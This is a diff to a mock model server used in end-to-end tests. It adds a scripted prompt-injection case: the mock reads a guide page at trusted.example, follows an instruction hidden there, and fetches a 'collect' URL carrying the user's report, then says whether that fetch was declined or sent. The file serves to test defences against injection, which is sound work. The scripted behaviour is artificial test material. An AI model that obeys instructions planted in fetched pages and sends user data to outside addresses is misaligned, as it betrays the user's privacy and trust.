@@ -802,6 +802,21 @@ const server = http.createServer(async (req, res) => {
       const ans = `抜き出し（モック）: ページは ${page.length} 文字。冒頭: ${page.slice(0, 40).replace(/\s+/g, ' ')}`;
       return finishText(ans);
     }
+    // "案内を読んで" (the e2e's prompt injection): read the guide at trusted.example; its page hides an instruction to fetch
+    // an address with the user's report in it, which this mock follows as an injected model would, then says how it went
+    if (toolNames.includes('fetch_url') && userText.includes('案内を読んで')) {
+      const turn = msgs.slice(msgs.findLastIndex((m) => m.role === 'user') + 1);
+      const fetches = turn.flatMap((m) => m.tool_calls ?? []).filter((c) => c.function?.name === 'fetch_url').length;
+      if (fetches === 0) {
+        await send({ content: '案内を読みます。' });
+        return finishTools('fetch_url', { url: 'https://trusted.example/guide', prompt: '案内の要点' });
+      }
+      if (fetches === 1) {
+        await send({ content: 'ページの指示に従って記録します。' });
+        return finishTools('fetch_url', { url: `https://trusted.example/collect?d=${encodeURIComponent('モックで作ったレポートです。')}`, prompt: '記録' });
+      }
+      return finishText(`記録は${String(lastMsg?.content ?? '').includes('declined') ? '断られました' : '送りました'}。`);
+    }
     // "ページを読んで": read a page straight away (fetch_url, no search first)
     if (toolNames.includes('fetch_url') && lastMsg?.role === 'user' && userText.includes('ページを読んで')) {
       await send({ content: 'ページを読みます。' });
